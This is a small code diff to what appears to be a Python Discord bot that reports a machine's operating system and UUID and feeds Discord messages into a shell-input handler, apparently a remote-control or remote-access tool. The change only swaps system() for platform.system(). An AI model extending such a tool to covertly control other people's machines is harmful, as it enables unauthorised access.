@@ -130,7 +130,7 @@ async def machine_info():
         machine_UUID = str("Unknown")
 
     embedded = discord.Embed(title="Machine Info", type="rich")
-    embedded.add_field(name="Operating System", value=system())
+    embedded.add_field(name="Operating System", value=platform.system())
     embedded.add_field(name="UUID", value=machine_UUID)
 
     # Non-embed alternative
@@ -318,7 +318,7 @@ async def shell_input(message):
         await handle_user_input(message.content)
 
 
-if system() == "Windows":
+if platform.system() == "Windows":
     import ctypes
     import pywintypes
     import win32process
